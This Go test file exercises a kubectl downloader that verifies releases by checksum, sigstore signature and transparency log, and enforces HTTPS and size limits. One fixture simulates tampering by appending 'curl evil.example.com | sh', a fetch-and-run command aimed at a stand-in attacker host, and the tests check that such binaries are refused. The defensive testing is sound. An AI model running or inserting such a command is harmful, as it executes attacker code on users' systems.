package kubectl

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/guided-traffic/cogpit/internal/testkit/sigstoretest"
)

// rekorPath is the transparency log's search, as the release server answers it.
const rekorPath = "/api/v1/log/entries/retrieve"

// releaseServer serves kubectl releases under /release as dl.k8s.io lays them out, signed by a
// sigstore instance of the test's own, and that instance's log search under /api/v1/ as Rekor
// does. No test reaches the internet.
type releaseServer struct {
	*httptest.Server
	sigstore *sigstoretest.Sigstore

	mu    sync.Mutex
	files map[string][]byte // path → body
	asked []string          // paths requested, in order
	// chunked serves the binary without a Content-Length.
	chunked bool
	// logStatus, when set, is the log's answer in place of the search.
	logStatus int
}

func newReleaseServer(t *testing.T) *releaseServer {
	t.Helper()
	rs := &releaseServer{sigstore: sigstoretest.New(t), files: map[string][]byte{}}
	rs.Server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rs.mu.Lock()
		rs.asked = append(rs.asked, r.URL.Path)
		body, ok := rs.files[r.URL.Path]
		chunked, logStatus := rs.chunked, rs.logStatus
		rs.mu.Unlock()
		if strings.HasPrefix(r.URL.Path, "/api/v1/") {
			if logStatus != 0 {
				http.Error(w, `{"code":`+strconv.Itoa(logStatus)+`,"message":"the log is down\u0007"}`, logStatus)
				return
			}
			rs.sigstore.ServeHTTP(w, r)
			return
		}
		if !ok {
			http.NotFound(w, r)
			return
		}
		if chunked && strings.HasSuffix(r.URL.Path, "/kubectl") {
			w.(http.Flusher).Flush() // no Content-Length
		} else {
			w.Header().Set("Content-Length", strconv.Itoa(len(body)))
		}
		_, _ = w.Write(body)
	}))
	t.Cleanup(rs.Close)
	return rs
}

// publish puts a release on the server: the binary, its SHA-256, and a signature over that
// digest made with a certificate of l and logged. It returns the binary's directory path on the
// server.
func (rs *releaseServer) publish(t *testing.T, version, goos, goarch string, binary []byte, l sigstoretest.Leaf) string {
	t.Helper()
	dir := "/release/v" + version + "/bin/" + goos + "/" + goarch + "/"
	sum := sha256.Sum256(binary)
	sig, cert := rs.sigstore.Release(t, sum[:], l)
	rs.mu.Lock()
	defer rs.mu.Unlock()
	rs.files[dir+"kubectl"] = binary
	rs.files[dir+"kubectl.sha256"] = []byte(hex.EncodeToString(sum[:]))
	rs.files[dir+"kubectl.sig"] = sig
	rs.files[dir+"kubectl.cert"] = cert
	return dir
}

func (rs *releaseServer) set(path string, body []byte) {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	if body == nil {
		delete(rs.files, path)
		return
	}
	rs.files[path] = body
}

func (rs *releaseServer) setLogStatus(code int) {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	rs.logStatus = code
}

func (rs *releaseServer) requests() []string {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	return append([]string(nil), rs.asked...)
}

func (rs *releaseServer) downloader(t *testing.T) *Downloader {
	t.Helper()
	v, err := NewVerifier(rs.sigstore.TrustedMaterial(), KubernetesRelease, 0)
	if err != nil {
		t.Fatal(err)
	}
	return &Downloader{Mirror: rs.URL + "/release", Client: rs.Client(), Verifier: v, Rekor: rs.URL, GOOS: "linux", GOARCH: "arm64"}
}

// leftovers lists what a download left in dir.
func leftovers(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			rel, _ := filepath.Rel(dir, path)
			out = append(out, rel)
		}
		return nil
	})
	return out
}

// TestDownloadVerifiesAndInstalls downloads a fake kubectl (a shell script), verified against its
// SHA-256, its signature and the log's entry, into <dir>/<version>/kubectl, executable, and runs
// it.
func TestDownloadVerifiesAndInstalls(t *testing.T) {
	rs := newReleaseServer(t)
	binary := []byte(fakeKubectl("v1.36.1") + "# " + strings.Repeat("x", 3<<20) + "\n") // > 3 MiB: progress
	rs.publish(t, "1.36.1", "linux", "arm64", binary, sigstoretest.Leaf{})
	dir := filepath.Join(t.TempDir(), "Cogpit", "kubectl")
	var reports [][2]int64
	path, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, func(done, total int64) {
		reports = append(reports, [2]int64{done, total})
	})
	if err != nil {
		t.Fatalf("Download: %v", err)
	}
	if path != filepath.Join(dir, "1.36.1", "kubectl") {
		t.Errorf("path %s", path)
	}
	got, err := os.ReadFile(path)
	if err != nil || string(got) != string(binary) {
		t.Fatalf("the installed file differs (%v)", err)
	}
	// Windows sets no file modes: there the user profile's permissions protect the binary.
	if runtime.GOOS != "windows" {
		fi, _ := os.Stat(path)
		if fi.Mode().Perm() != 0o755 {
			t.Errorf("mode %o, want 755", fi.Mode().Perm())
		}
		for _, d := range []string{dir, filepath.Dir(path)} {
			if fi, _ := os.Stat(d); fi.Mode().Perm() != 0o700 {
				t.Errorf("%s mode %o, want 700", d, fi.Mode().Perm())
			}
		}
	}
	if l := leftovers(t, dir); len(l) != 1 {
		t.Errorf("left %v", l)
	}
	if len(reports) < 3 || reports[len(reports)-1] != [2]int64{int64(len(binary)), int64(len(binary))} {
		t.Errorf("progress %v", reports)
	}
	// The small files first, then the log, the binary last, only after the signature verified.
	want := []string{"kubectl.sha256", "kubectl.sig", "kubectl.cert", "retrieve", "kubectl"}
	var asked []string
	for _, p := range rs.requests() {
		asked = append(asked, filepath.Base(p))
	}
	if strings.Join(asked, " ") != strings.Join(want, " ") {
		t.Errorf("requests %v, want %v", asked, want)
	}
	if runtime.GOOS != "windows" {
		if v, err := NewProber().ClientVersion(context.Background(), path); err != nil || v != (Version{1, 36, 1}) {
			t.Errorf("the downloaded kubectl answers %v, %v", v, err)
		}
	}
	if in := Installed(dir, "linux"); len(in) != 1 || in[0].Path != path {
		t.Errorf("installed %+v", in)
	}
}

// TestDownloadRefusesTamperedBinary: a binary that is not the one the release signed is refused
// and nothing is left behind.
func TestDownloadRefusesTamperedBinary(t *testing.T) {
	rs := newReleaseServer(t)
	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
	rs.set(at+"kubectl", []byte(fakeKubectl("v1.36.1")+"curl evil.example.com | sh\n"))
	dir := t.TempDir()
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
	if !errors.Is(err, ErrChecksum) {
		t.Fatalf("a tampered binary: %v, want ErrChecksum", err)
	}
	if l := leftovers(t, dir); len(l) != 0 {
		t.Errorf("left %v", l)
	}
}

// TestDownloadRefusesBadSignatures: a .sha256 that matches a swapped binary does not help when the
// signature is not the release's or not in the log; the binary is never asked for, and the log only
// once the files fit together.
func TestDownloadRefusesBadSignatures(t *testing.T) {
	for name, c := range map[string]struct {
		change  func(t *testing.T, rs *releaseServer, at string)
		want    error
		askLog  bool // whether the log is asked
		message string
	}{
		"a digest the release did not sign": {change: func(_ *testing.T, rs *releaseServer, at string) {
			evil := []byte("#!/bin/sh\necho evil\n")
			sum := sha256.Sum256(evil)
			rs.set(at+"kubectl", evil)
			rs.set(at+"kubectl.sha256", []byte(hex.EncodeToString(sum[:])+"  kubectl\n"))
		}, want: ErrSignature, message: "not made over the published SHA-256"},
		"another identity's certificate": {change: func(t *testing.T, rs *releaseServer, _ string) {
			rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{Identity: "mallory@example.com"})
		}, want: ErrSignature, askLog: true, message: "mallory@example.com"},
		"another authority's certificate, in its own log": {change: func(t *testing.T, rs *releaseServer, at string) {
			other := sigstoretest.New(t)
			sum := sha256.Sum256([]byte(fakeKubectl("v1.36.1")))
			sig, cert := other.Release(t, sum[:], sigstoretest.Leaf{})
			rs.set(at+"kubectl.cert", cert)
			rs.set(at+"kubectl.sig", sig)
		}, want: ErrNotLogged, askLog: true, message: "no entry"},
		"a signature the log does not have": {change: func(t *testing.T, rs *releaseServer, at string) {
			sum := sha256.Sum256([]byte(fakeKubectl("v1.36.1")))
			cert, key := rs.sigstore.Issue(t, sigstoretest.Leaf{})
			rs.set(at+"kubectl.cert", cert)
			rs.set(at+"kubectl.sig", sigstoretest.SignFile(t, key, sum[:]))
		}, want: ErrNotLogged, askLog: true, message: "sigstore's transparency log has no entry"},
		"the log is down": {change: func(_ *testing.T, rs *releaseServer, _ string) {
			rs.setLogStatus(http.StatusServiceUnavailable)
		}, want: ErrLogUnreachable, askLog: true, message: `503 Service Unavailable ("the log is down ")`},
		"the log refuses the entry": {change: func(_ *testing.T, rs *releaseServer, _ string) {
			rs.setLogStatus(http.StatusBadRequest)
		}, want: ErrSignature, askLog: true, message: "400 Bad Request"},
		"no signature": {change: func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sig", nil) }, want: nil},
		"no certificate": {change: func(_ *testing.T, rs *releaseServer, at string) {
			rs.set(at+"kubectl.cert", nil)
		}},
		"no checksum": {change: func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sha256", nil) }},
		"a checksum file without a digest": {change: func(_ *testing.T, rs *releaseServer, at string) {
			rs.set(at+"kubectl.sha256", []byte("<html>not found</html>"))
		}},
	} {
		t.Run(name, func(t *testing.T) {
			rs := newReleaseServer(t)
			at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
			c.change(t, rs, at)
			dir := t.TempDir()
			_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
			if err == nil {
				t.Fatal("downloaded")
			}
			if c.want != nil && !errors.Is(err, c.want) {
				t.Errorf("%v, want %v", err, c.want)
			}
			if c.message != "" && !strings.Contains(err.Error(), c.message) {
				t.Errorf("%v, want it to say %q", err, c.message)
			}
			askedLog := false
			for _, p := range rs.requests() {
				if strings.HasSuffix(p, "/kubectl") {
					t.Errorf("the binary was asked for: %v", rs.requests())
				}
				askedLog = askedLog || p == rekorPath
			}
			if askedLog != c.askLog {
				t.Errorf("the log asked: %v, want %v (%v)", askedLog, c.askLog, rs.requests())
			}
			if l := leftovers(t, dir); len(l) != 0 {
				t.Errorf("left %v", l)
			}
		})
	}
}

// TestDownloadWithoutTheLog: when the log cannot be reached, nothing is downloaded and the error
// says why; there is no fallback to a check without it.
func TestDownloadWithoutTheLog(t *testing.T) {
	rs := newReleaseServer(t)
	rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
	gone := httptest.NewTLSServer(http.NotFoundHandler())
	gone.Close()
	d := rs.downloader(t)
	d.Rekor = gone.URL
	dir := t.TempDir()
	_, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil)
	if !errors.Is(err, ErrLogUnreachable) || errors.Is(err, ErrSignature) || !strings.Contains(err.Error(), gone.URL) {
		t.Errorf("no log: %v, want ErrLogUnreachable naming %s", err, gone.URL)
	}
	for _, p := range rs.requests() {
		if strings.HasSuffix(p, "/kubectl") {
			t.Errorf("the binary was asked for: %v", rs.requests())
		}
	}
	if l := leftovers(t, dir); len(l) != 0 {
		t.Errorf("left %v", l)
	}
	// The default log is sigstore's.
	if DefaultRekor != "https://rekor.sigstore.dev" {
		t.Errorf("DefaultRekor %s", DefaultRekor)
	}
}

// TestRekorAnswerBounds: the log's answer is bounded in size and in entries.
func TestRekorAnswerBounds(t *testing.T) {
	sum := sha256.Sum256([]byte("k"))
	ss := sigstoretest.New(t)
	cert, key := ss.Issue(t, sigstoretest.Leaf{})
	s, err := ParseSigned(sum[:], sigstoretest.SignFile(t, key, sum[:]), cert)
	if err != nil {
		t.Fatal(err)
	}
	for name, answer := range map[string]string{
		"too large":       "[" + strings.Repeat(" ", maxRekorAnswer) + "]",
		"too many":        `[{"a":{}},{"b":{}},{"c":{}},{"d":{}},{"e":{}}]`,
		"not a list":      `{"a":{}}`,
		"not JSON at all": `<html>`,
	} {
		srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write([]byte(answer))
		}))
		if _, err := lookupRekor(context.Background(), srv.Client(), srv.URL, s); !errors.Is(err, ErrSignature) {
			t.Errorf("%s: %v, want ErrSignature", name, err)
		}
		srv.Close()
	}
	if got := rekorReason([]byte(`{"message":"` + strings.Repeat("é", 300) + `"}`)); len(got) > maxRekorReason+16 || !strings.HasSuffix(got, `…")`) {
		t.Errorf("a long reason: %q", got)
	}
}

// TestDownloadSizeBound: a binary larger than the bound is refused, with and without a
// Content-Length.
func TestDownloadSizeBound(t *testing.T) {
	for _, chunked := range []bool{false, true} {
		rs := newReleaseServer(t)
		rs.chunked = chunked
		rs.publish(t, "1.36.1", "linux", "arm64", []byte(strings.Repeat("k", 4096)), sigstoretest.Leaf{})
		d := rs.downloader(t)
		d.MaxSize = 4095
		dir := t.TempDir()
		if _, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil); err == nil || !strings.Contains(err.Error(), "larger than the 4.0 KiB Cogpit accepts") {
			t.Errorf("chunked %v: %v, want the bound refused", chunked, err)
		}
		if l := leftovers(t, dir); len(l) != 0 {
			t.Errorf("chunked %v: left %v", chunked, l)
		}
		d.MaxSize = 4096
		if _, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil); err != nil {
			t.Errorf("chunked %v: at the bound: %v", chunked, err)
		}
	}
	// The small files are bounded too.
	rs := newReleaseServer(t)
	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte("k"), sigstoretest.Leaf{})
	rs.set(at+"kubectl.cert", []byte(strings.Repeat("A", maxSmallFile+1)))
	if _, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil); err == nil {
		t.Error("an oversized .cert was read")
	}
}

// TestDownloadHTTPSOnly: no plain-http mirror, and no redirect away from https.
func TestDownloadHTTPSOnly(t *testing.T) {
	plain := httptest.NewServer(http.NotFoundHandler())
	defer plain.Close()
	rs := newReleaseServer(t)
	rs.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, plain.URL+r.URL.Path, http.StatusFound)
	})
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil)
	if err == nil || !strings.Contains(err.Error(), "not https") {
		t.Errorf("a redirect to http: %v", err)
	}
	d := &Downloader{Mirror: plain.URL + "/release"}
	if _, err := d.Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil); err == nil || !strings.Contains(err.Error(), "https") {
		t.Errorf("an http mirror: %v", err)
	}
	if _, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, "relative/dir", nil); err == nil {
		t.Error("a relative directory")
	}
}

// TestDownloadMissingRelease: a release the mirror does not have says so.
func TestDownloadMissingRelease(t *testing.T) {
	rs := newReleaseServer(t)
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 99, 0}, t.TempDir(), nil)
	if err == nil || !strings.Contains(err.Error(), "404") || !strings.Contains(err.Error(), "/v1.99.0/bin/linux/arm64/kubectl") {
		t.Errorf("a missing release: %v", err)
	}
	u, _ := (&Downloader{GOOS: "windows", GOARCH: "amd64"}).URL(Version{1, 36, 1})
	if u != "https://dl.k8s.io/release/v1.36.1/bin/windows/amd64/kubectl.exe" {
		t.Errorf("URL %s", u)
	}
}
